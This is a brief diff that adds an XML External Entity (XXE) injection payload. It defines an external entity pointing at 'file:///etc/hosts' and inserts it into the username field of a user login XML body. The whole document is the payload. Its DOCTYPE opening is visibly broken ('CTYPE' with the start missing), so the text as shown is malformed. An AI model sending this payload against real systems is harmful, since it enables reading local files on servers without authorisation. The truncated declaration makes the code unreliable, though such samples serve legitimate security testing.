@@ -1,0 +1,9 @@
+CTYPE test [
+<!ENTITY name SYSTEM "file:///etc/hosts">
+]>
+<user>
+  <username>&name;</username>
+  <password>1</password>
+</user>
+
+
